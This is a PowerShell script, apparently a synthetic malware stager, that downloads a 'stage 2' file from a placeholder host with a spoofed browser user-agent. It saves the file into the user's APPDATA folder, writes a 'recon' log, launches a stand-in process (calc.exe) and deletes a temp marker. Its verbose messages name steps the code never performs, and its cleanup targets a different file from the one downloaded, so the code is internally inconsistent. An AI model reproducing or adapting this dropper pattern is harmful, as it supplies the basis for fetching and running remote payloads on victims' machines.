
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://example.org:8080/stage2.ps1',
    [string]$DownloadPath = "$env:APPDATA\payload.bin",
    [string]$StageLog = "$env:TEMP\recon.log",
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$ConnectionTimeout = 136,
    [int]$RetryCount = 1,
    [int]$RetryDelay = 6
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 1,
        [int]$RetryDelay = 6,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $PayloadUrl
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $DownloadPath -RetryCount $RetryCount -RetryDelay $RetryDelay -UserAgent $BrowserAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe"
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $PayloadUrl
    Destination = $DownloadPath
    RetryCount = $RetryCount
    TimeoutSec = $ConnectionTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Inspecting process list"
Write-Verbose "Applying operation timeout"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
Write-Verbose "Stage handoff finished"
Write-Verbose "Reading configuration values"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Checking local path"
Write-Verbose "Cleaning temporary marker"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
